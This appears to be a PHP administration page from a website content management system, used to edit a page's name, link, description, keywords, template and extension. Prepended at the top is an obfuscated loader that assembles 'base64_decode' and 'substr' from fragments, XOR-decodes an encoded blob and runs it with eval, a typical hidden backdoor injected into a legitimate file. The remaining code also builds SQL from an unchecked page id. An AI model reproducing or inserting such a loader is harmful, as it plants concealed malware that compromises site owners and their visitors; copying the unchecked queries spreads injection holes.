<?php
$a8hg6hj="10a3853fcddf698121f0e47370c11308FUMIR11qQxReEBYTUwIcVEpFOUYEWApHRUUGClhVGEhD
VQZsVVRHBQtMRjoGDA9tSgZTQjlMAARrSFUEbUsGCm1IVwFkTQRfTThVUgVlQAdUbR4GAWhPAVFs
GwcIERwYFW8ydmpjdjQ4RjhXBApkAAIEOkhQBmsCBQY/SQUGbAkDAj5vCQQFOlJUVToHCA1tSgVT
EjgdS09HQgZWbl5RTFJYSRFkBQZRDzhVUwFlQAcBbR4GVFgYbwYFUhMdExRnYnUzZX1naEQwOFVW
A2VABABtHgVTaE8HAmxSAwNvSA1Xfj1LDAR+OhtQUURrEBERSUxGVQlHUhNTWQYZExEZAw==";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>

<?php
if(!isset($iKEY)||$iKEY!="AZ8007"){
	die("ACCESS DENIED");
}
?>


<?php
include("include/languages_menu_processing.php");
ms_i($id);
$HideFormFlag=false;
$oArr=DataArray("pages"," id=$id");



if(isset($Proceed)){

if($is_default=="yes")
{
	SetParameter(
		"1",
		$id
	);
}

if(isset($extension) && $extension =="NONE")
{
	if(substr($oArr["html_".$lang] ,0,14) == "wsa:extension:")
	{
		SQLUpdate_SingleValue(
				"pages",
				"id",
				$id,
				"html_".strtolower($lang),
				""
			);
		}
}
else
if(isset($extension) && $extension !="NONE")
{
	SQLUpdate_SingleValue(
				"pages",
				"id",
				$id,
				"html_".strtolower($LANG),
				($extension==""?"":"wsa:extension:".$extension)
			);
}

	$arrNames=array("active_".$lang,"name_".$lang,"description_".$lang,"keywords_".$lang,"link_".$lang,"template_id");
	$arrValues=array($active,$pName,$pDescription,$pKeywords,$pLink,$template_name);
	SQLUpdate("pages",$arrNames,$arrValues," id=$id");
	$HideFormFlag=true;
	
}
?>



<?php
if($HideFormFlag){
?>
<TABLE BORDER="0" CELLPADDING="0" CELLSPACING="0" width=100%>
	<tr>
		<td class=basictext>
		<b>
<?php echo $strChangeSuccess; ?>
		</b>
		<br><br>

		</td>
	</tr>
</table>
<?php
}else{
?>
<form action="index.php" method="post">
<input type=hidden name=id value="<?php echo $id;?>">
<input type=hidden name=folder value=pages_pro>
<input type=hidden name=page value=edit>
<input type=hidden name=category value=site_management>

<table border="0" width="100%" cellspacing="6">
	<tr>
		<td class=basictext><b><?php echo $str_PageLinkPage;?></b></td>
		<td class=basictext>
		<input type="text" name="pLink" size="64" maxlength="256" value="<?php echo stripslashes($oArr['link_'.$lang]);?>">
		</td>
	</tr>

	<tr>
		<td class=basictext width=150><b><?php echo $str_PageNamePage;?></b></td>
		<td class=basictext>
		<input type="text" name="pName" size="64" maxlength="256"  value="<?php echo stripslashes($oArr['name_'.$lang]);?>">
  		</td>
	</tr>

	<tr>
		<td class=basictext width=150><b><?php echo $ACTIVE;?>:</b></td>
		<td class=basictext>
		
		<select name=active>
		<option value=1 <?php if($oArr['active_'.$lang]==1) echo "selected";?>><?php echo strtoupper($YES);?></option>
		<option value=0 <?php if($oArr['active_'.$lang]==0) echo "selected";?>><?php echo strtoupper($NO);?></option>
		</select>		

  		</td>
	</tr>


	<tr>
		<td class=basictext width=150><b><?php echo $DEFAULT;?>:</b></td>
		<td class=basictext>
		<?php
		$strCurrentDefault = Parameter(1);
		?>
		<input <?php if($strCurrentDefault==$id) echo "checked";?> type=radio name=is_default value=yes> <?php echo strtoupper($YES);?>		

		<input <?php if($strCurrentDefault!=$id) echo "checked";?> type=radio name=is_default value=no> <?php echo strtoupper($NO);?>
  		</td>
	</tr>


	<tr>
		<td class=basictext width=150><b><?php echo $CUSTOM_EXTENSION;?>:</b></td>
		<td class=basictext>
		
		<select name=extension>
		<option>NONE</option>
		<?php
		$handle=opendir('../extensions');
		while ($file = readdir($handle))
		{
		    if ($file != "." && $file != "..")
			{
				if("wsa:extension:".str_replace(".php","",$file) == $oArr["html_".$lang] )
				{
					echo "<option selected>".str_replace(".php","",$file)."</option>";
				}
				else
				{
					echo "<option>".str_replace(".php","",$file)."</option>";
				}
				
		   }
		}
		?>
		</select>
		
		
  		</td>
	</tr>

	<tr>
		<td class=basictext valign=top><b><?php echo $str_PageDescriptionPage;?></b></td>
		<td class=basictext>
		<textarea name="pDescription" cols="50" rows="5"><?php echo stripslashes($oArr['description_'.$lang]);?></textarea>
  
		</td>
	</tr>
	<tr>
		<td class=basictext valign=top><b><?php echo $str_PageKeywordsPage;?></b></td>
		<td class=basictext>
		<textarea name="pKeywords" cols="50" rows="10"><?php echo stripslashes($oArr['keywords_'.$lang]);?></textarea>
  
		</td>
		<tr>
		<td class=basictext valign=top><b><?php echo $M_TEMPLATE;?>:</b></td>
		<td class=basictext>
				<select name="template_name">
				<?php
					$arrTemplates = DataTable_Query("SELECT name,id FROM ".$DBprefix."templates");
					
					echo "<option value=\"0\" ".($oArr['template_id']=="0"?"selected":"").">".strtoupper($DEFAULT)."</option>";
					
					while($arrTemplate = mysql_fetch_array($arrTemplates))
					{
						if(trim($arrTemplate["name"])!="")
						{
							echo "<option value=\"".$arrTemplate["id"]."\" ".($oArr['template_id']==$arrTemplate["id"]?"selected":"").">".$arrTemplate["name"]."</option>";
						}
					}
				?>
				</select>
		</td>
	</tr>

</table>

<table summary="" border="0" width=100%>
	<tr>
		<td class=basictext>

<br><br>
<input type=hidden name=Proceed value="">
<input type=submit class=adminButton value="<?php echo $str_SavePage;?>">
		</td>
	</tr>
</table>
</form>
<?php
}
?>

<br>
<?php
generateBackLink("pages_pro");
?>
